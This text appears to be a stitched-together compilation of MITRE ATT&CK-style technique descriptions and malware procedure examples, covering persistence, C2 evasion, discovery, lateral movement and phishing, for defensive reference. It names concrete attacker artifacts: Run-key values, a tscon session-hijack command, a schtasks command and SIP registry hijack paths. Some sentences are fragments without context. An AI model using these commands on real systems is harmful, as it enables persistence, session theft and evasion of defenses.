FakeM C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo!
KeyBoy uses custom SSL libraries to impersonate SSL in C2 traffic.
BADCALL uses a FakeTLS method during C2.
Protocol Tunneling may also be abused by adversaries during Dynamic Resolution.
Known as DNS over HTTPS , queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.
FLIPSIDE uses RDP to tunnel traffic from a victim environment.
Chimera has encapsulated Cobalt Strike's C2 protocol in DNS and HTTPS.

Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.
A TYPEFRAME variant can force the compromised system to function as a proxy server.
Kessel can use a proxy during exfiltration if set in the configuration.
Ngrok can be used to proxy connections to machines located behind NAT or firewalls.
Gazer identifies a proxy server if it exists and uses it to make HTTP requests.
Turla RPC backdoors have included local UPnP RPC proxies.
Operation Wocao has used a custom proxy tool called "Agent" which has support for multiple hops.
Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.
The script is signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe.
APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.
Machete is written in Python and is used in conjunction with additional Python scripts.
Bundlore has used Python scripts to execute payloads.
Machete's main backdoor Machete is also written in Python.
APT29 has developed malware variants written in Python.
Kimsuky has used a Mac OS Python implant to gather data.
MuddyWater has used developed tools in Python including Out1.
Information can easily be queried using the Reg utility, though other means to access the Registry exist.

Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
Hydraq creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.
FELIXROOT queries the Registry for specific keys for potential privilege escalation and proxy information.
FELIXROOT has also used WMI to query the Windows Registry.
BACKSPACE is capable of enumerating and making modifications to an infected system's Registry.
Epic uses the rem reg query command to obtain values from Registry keys.
Gold Dragon enumerates registry keys with the command regkeyenum and obtains information for the Registry key HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.
CHOPSTICK provides access to the Windows Registry, which can be used to gather information.
Derusbi is capable of enumerating Registry keys and values.
Bankshot searches for certain Registry keys to be configured before executing the payload.
A variant of HOPLIGHT hooks lsass.exe, and lsass.exe then checks the Registry for the data value 'rdpproto' under the key SYSTEM\CurrentControlSet\Control\Lsa Name.
Attor has opened the registry and performed query searches.
REvil can query the Registry to get random file extensions to append to encrypted files.
Stuxnet searches the Registry for indicators of security programs.
Taidoor can query the Registry on compromised hosts using RegQueryValueExA.

RC scripts require root privileges to modify.
This is now a deprecated mechanism in macOS in favor of Launchd.

With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe session number to be stolen`, an adversary can hijack a session without the need for credentials or prompts to the user.
It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session.
Adversaries may abuse the ROM Monitor  by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect.
An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim.
Likewise, one or more reflector may be used to focus traffic on the target.
Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers.
Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk.
Cuba loaded the payload into memory using PowerShell.
Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key.
Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.
The startup folder path for the current user is C:\Users\\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.

The HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit and HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell subkeys can automatically launch programs.
Gazer can establish persistence by creating a .lnk file in the Start menu.
Mivast creates the following Registry entry: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Micromedia.

CORESHELL has established persistence by creating autostart extensibility point  Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder.

Most Sakula samples maintain persistence by setting the Registry Run key SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ in the HKLM or HKCU hive, with the Registry value and file name varying by sample.
RTM tries to add a Registry Run key under the name "Windows Update" to establish persistence.

BBSRAT has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the Registry Run key location HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr.exe.
HTTPBrowser has established persistence by setting the HKCU\Software\Microsoft\Windows\CurrentVersion\Run key value for wdm to the path of the executable.
Helminth establishes persistence by creating a shortcut in the Start Menu folder.
NavRAT creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.
Pteranodon copies itself to the Startup folder to establish persistence.

A version of KONNI drops a Windows shortcut into the Startup folder to establish persistence.
PLAINTEE gains persistence by adding the Registry key HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce.
RunningRAT adds itself to the Registry key Software\Microsoft\Windows\CurrentVersion\Run to establish persistence upon reboot.
Rover persists by creating a Registry entry in HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\.
If this fails, it attempts to add Registry Run keys.
TINYTYPHON installs itself under Registry Run key to establish persistence.
gh0st RAT has added a Registry Run key to establish persistence.
SNUGRIDE establishes persistence through a Registry Run key.
Bisonal adds itself to the Registry key HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run\ for persistence.
Xbash can create a Startup item for persistence if it determines it is on a Windows system.

njRAT has added persistence via the Registry key HKCU\Software\Microsoft\CurrentVersion\Run\ and dropped a shortcut in %STARTUP%.

GrimAgent can set persistence with a Registry run key.
BoomBox can establish persistence by writing the Registry value MicroNativeCacheSvc to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
Turian can establish persistence by adding Registry Run keys.

Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.
FIN10 has established persistence by using the Registry option in PowerShell Empire to add a Run key.

The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.
Several Ke3chang backdoors achieved persistence by adding a Run key.
Magic Hound malware has used Registry Run keys to establish persistence.
APT39 has maintained persistence using the startup folder.
Molerats saved malicious files within the AppData and Startup folders to maintain persistence.
Rocke's miner has created UPX-packed files in the Windows Start Menu Folder.
Mustang Panda has created the registry key HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AdobelmdyU to maintain persistence.

The group has also used regsvr32 to run their backdoor.

Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability.
One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency.
LoudMiner harvested system resources to mine cryptocurrency, using XMRig to mine Monero.
Lucifer can use system resources to mine cryptocurrency, dropping XMRig to mine Monero.
Adversaries may abuse the right-to-left override  character  to disguise a string and/or file name to make it appear benign.
A JavaScript file named photo_high_re\u202Egnp.js will be displayed as photo_high_resj.png.
Scarlet Mimic has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names.
BRONZE BUTLER has used Right-to-Left Override to deceive victims into executing several strains of malware.
Ferocious Kitten has used right-to-left override to reverse executables’ names to make them appear to have different file extensions, rather than their real ones.
Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data.
This technique may bypass system logging and security monitors such as security information and event management  products .

Umbreon hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.
HIDEDRV is a rootkit that hides certain operating system artifacts.

Skidmap is a kernel-mode rootkit that has the ability to hook system calls to hide specific files and fake network and CPU-related statistics to make the CPU load of the infected machine always appear low.
starts a rootkit from a malicious file dropped to disk.
Winnti Group used a rootkit to modify typical server functionality.
A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment.
The use of a shared folder specified in the configuration enables Ragnar Locker to encrypt files on the host operating system, including files on any mapped drives.

Bisonal uses rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\”vert” = “rundll32.exe c:\windows\temp\pvcu.dll , Qszdez”.
Pteranodon executes functions using rundll32.exe.
Briba uses rundll32 within Registry Run Keys / Startup Folder entries to execute malicious DLLs.
StreamEx uses rundll32 to call an exported function.
JHUHUGIT is executed using rundll32.exe.
ADVSTORESHELL has used rundll32.exe in a Registry value to establish persistence.
Attor's installer plugin can schedule rundll32.exe to load the dispatcher.
Ragnar Locker has used rundll32.exe to execute components of VirtualBox.
InvisiMole has used rundll32.exe for execution.
Egregor has used rundll32 during execution.
Sibot has executed downloaded DLLs with rundll32.exe.
NativeZone has used rundll32 to execute a malicious DLL.
APT28 also executed a .dll for a first stage dropper using rundll32.exe.
APT29 has used Rundll32.exe to execute payloads.
Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using rundll32.exe.
APT41 has used rundll32.exe to execute a loader.
APT38 has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user.
APT29 created tokens using compromised SAML signing certificates.
With Domain Administrator  rights, harvested or well-known SID values  may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators.
Unique SIPs exist for most file formats  and are identified by globally unique identifiers .

Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious  code as signed by: 
* Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID} that point to the dynamic link library  providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file.

By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value  rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP  .

* Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID} that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value.
This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.
* **Note:** The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking.

Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls , transfer files, and run transferred binaries through remote Execution.
The Regin malware platform can use Windows admin shares to move laterally.
Ryuk has used the C$ network share for lateral movement.
Deep Panda uses net.exe to connect to network shares using net use commands with compromised credentials.
Turla used net use commands to connect to lateral systems within a network.
Operation Wocao has used Impacket's smbexec.py as well as accessing the C$ and IPC$ shares to move laterally.
APT28 has mapped network drives using Net and administrator credentials.
Sandworm Team has run net use to connect to network shares.
SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages.

Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.
To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.
Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.
The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured.
This file is usually found in the user's home directory under <user-home>/.ssh/authorized_keys.
Skidmap has the ability to add the public key of its handlers to the authorized_keys file to maintain persistence on an infected host.
Bundlore creates a new key pair with ssh-keygen and drops the newly created user key in authorized_keys to enable remote login.
XCSSET will upload a private key file to the server to remotely access the host without a password.
TeamTNT has added RSA keys in authorized_keys.
It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.
This may occur through compromising the SSH agent itself or by having access to the agent's socket.
Adversaries may abuse Windows safe mode to disable endpoint defenses.
Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data  stores, which are files that manage boot application settings.
REvil can force a reboot in safe mode with networking.
Adversaries may search within public scan databases for information about victims that can be used during targeting.
Adversaries may scan victim IP blocks to gather information that can be used during targeting.
The deprecated at utility could also be abused by adversaries , though at.exe can not access tasks created with schtasks or the Control Panel.
GravityRAT creates a scheduled task to ensure it is re-executed everyday.
Shamoon copies an executable payload to the target system by using SMB/Windows Admin Shares and then scheduling an unnamed task to execute the malware.
Carbon creates several tasks for later execution to continue persistence on the victim’s machine.
QUADAGENT creates a scheduled task to maintain persistence on the victim’s machine.
One persistence mechanism used by CozyCar is to register itself as a scheduled task.
OopsIE creates a scheduled task to run itself every three minutes.
ISMInjector creates scheduled tasks to establish persistence.
Gazer can establish persistence by creating a scheduled task.
TrickBot creates a scheduled task on the system that provides persistence.
SQLRat has created scheduled tasks in %appdata%\Roaming\Microsoft\Templates\.
Ramsay can schedule tasks via the Windows COM API to maintain persistence.
Valak has used scheduled tasks to execute additional payloads and to gain persistence on a compromised host.
IcedID has created a scheduled task that executes every hour to establish persistence.
Agent Tesla  has achieved persistence via scheduled tasks.
Lokibot embedded the commands schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I inside a batch script.
A Patchwork file stealer can run a TaskScheduler DLL to add persistence.
FIN10 has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.
FIN7 malware has created scheduled tasks to establish persistence.
APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted during the 2020 SolarWinds intrusion.
Operation Wocao has used scheduled tasks to execute malicious PowerShell code on remote systems.
Molerats has created scheduled tasks to persistently run VBScripts.
They also manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.

APT38 has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence.
Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.
Dragonfly has used a scheduled task to execute a malicious file.
ADVSTORESHELL collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.

ShimRat can sleep when instructed to do so by the C2.

POWRUNER can capture a screenshot from a victim.
T9000 can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files.
RTM can capture screenshots.
Cobian RAT has a feature to perform screen capture.
Socksbot can take screenshots.
KONNI can take screenshots of the victim’s machine.
jRAT has the capability to take screenshots of the victim’s machine.
Prikormka contains a module that captures screenshots of the victim's desktop.
BISCUIT has a command to periodically take screenshots of the system.
Ursnif has used hooked APIs to take screenshots.
KeyBoy has a command to perform screen grabbing.
Metamorfo can collect screenshots of the victim’s machine.
ECCENTRICBANDWAGON can capture screenshots and store them locally.
MarkiRAT can capture screenshots that are initially saved as ‘scr.jpg’.
BLUELIGHT has captured a screenshot of the display every 30 seconds for the first 5 minutes after initiating a C2 loop, and then once every five minutes thereafter.

Malware used by Group5 is capable of watching the victim's screen.
BRONZE BUTLER has used a tool to capture screenshots.
GOLD SOUTHFIELD has used the remote monitoring and management tool ConnectWise to obtain screen captures from victim's machines.
Adversaries may search in different closed databases depending on what information they seek to gather.
Adversaries may craft various search engine queries depending on what information they seek to gather.
Adversaries may search in different online sites depending on what information they seek to gather.
Adversaries may search websites owned by the victim for information that can be used during targeting.
Enumerating the SAM database requires SYSTEM level access.
* RID 501 is the guest account.
HOPLIGHT has the capability to harvest credentials and passwords from the SAM database.
Wizard Spider has acquired credentials from the SAM/SECURITY registry hives.
This may include things such as firewall rules and anti-virus.
Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.
Crimson contains a command to collect information about anti-virus software on the victim.
RogueRobin enumerates running processes to search for Wireshark and Windows Sysinternals suite.
Gold Dragon checks for anti-malware products and processes.
POWRUNER may collect information on the victim's anti-virus software.
PUNCHBUGGY can gather AVs registered in the system.

InvisiMole can check for the presence of network sniffers, AV, and BitDefender firewall.

SpicyOmelette can check for the presence of 29 different antivirus tools.
xCaon has checked for the existence of Kaspersky antivirus software on the system.

In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.
Keydnap uses the keychaindump project to read securityd memory.
Turla has used compromised servers as infrastructure.
Olympic Destroyer utilizes PsExec to help propagate itself across a network.
Attor's dispatcher can be executed as a service.
Okrum's loader can create a new service named NtmsSvc to execute the payload.
If the key does not exist, gh0st RAT will create and run the service.
InvisiMole has used Windows services as a way to execute its malicious payload.
APT41 used  svchost.exe and Net to execute a system service installed to launch a Cobalt Strike BEACON loader.
Wizard Spider has used services.exe to execute scripts and executables during lateral movement within a victim network.
The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections.
If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm.
In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests.
In some cases, adversaries may stop or disable many or all services to render systems unusable.
Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.
REvil has the capability to stop services and kill processes.
EKANS stops database, data backup solution, antivirus, and ICS-related processes.
LookBack can kill processes and delete services.
Pysa can stop services and processes.
Adversaries may execute their own malicious payloads by hijacking the binaries used by services.
One variant of BlackEnergy locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable.
The malware then sets the hijacked service to start automatically to establish persistence.
Access to Registry keys is controlled through access control lists and user permissions.

When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under .
Adversaries may also alter other Registry keys in the service’s Registry tree.
An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context.
However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges.
Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications.
Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system.
Attor's dispatcher can execute additional plugins by loading the respective DLLs.
KillDisk loads and executes functions from a DLL.
RogueRobin establishes persistence by creating a shortcut  in the Windows startup folder to run a script each time the user logs in.
Helminth establishes persistence by creating a shortcut.
BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.
Astaroth's initial payload is a malicious .LNK file.
Grandoreiro can write or modify browser shortcuts to enable launching of malicious browser extensions.
Dragonfly 2.0 manipulated .lnk files to gather user credentials in conjunction with Forced Authentication.
APT39 has modified LNK shortcuts.
Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files.
Kerberos TGS tickets are also known as service tickets.
Adversaries may search social media for information about victims that can be used during targeting.
Adversaries may create and cultivate social media accounts that can be used during targeting.
For operations incorporating social engineering, the utilization of a persona on social media may be important.
Establishing a persona  on social media may require development of additional documentation to make them seem real.
Cleaver has created fake LinkedIn profiles that included profile photos, details, and connections.
Rather than creating and cultivating social media profiles  Social Media Accounts, adversaries may compromise existing social media accounts.

A variety of methods exist for compromising social media accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, or by brute forcing credentials .
Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.

Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network.
APT32 compromised McAfee ePO to move laterally by distributing malware as a software deployment task.
Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment.

Tropic Trooper's backdoor could list the infected system's installed software.

Anchor has come with a packed payload.

A Patchwork payload was packed with UPX.
Dark Caracal has used UPX to pack Bandook.
APT39 has packed tools with UPX, and has repacked a modified version of Mimikatz to thwart anti-virus detection.
GALLIUM packed some payloads using different types of packers, both known and custom.
With certain file types , appending a space to the end of a filename will change how the file is processed by the operating system.
For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute.
If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application .
Keydnap puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program.
The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses.

Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.
Rifdoor has been distributed in e-mails with malicious Excel or Word documents.
Metamorfo has been delivered to victims via emails with malicious HTML attachments.
AppleSeed has been distributed to victims through malicious e-mail attachments.
QakBot has spread through emails with malicious attachments.
Lokibot is delivered via a malicious XLS attachment contained within a spearhpishing email.
Bandook is delivered via a malicious Word document inside a zip file.
Taidoor has been delivered through spearphishing emails.

The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the “attachedTemplate” technique to load a template from a remote server.
Lazarus Group has targeted victims with spearphishing emails containing malicious Microsoft Word documents.
TA459 has targeted victims using spearphishing emails with malicious Microsoft Word attachments.
APT37 delivers malware using spearphishing emails with malicious HWP attachments.

The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate.

Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email  web bugs/web beacons.
Emotet has been delivered by phishing emails containing links.
Bazar has been spread via emails with embedded malicious links.
GuLoader has been spread in phishing campaigns using malicious web links.

In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy.
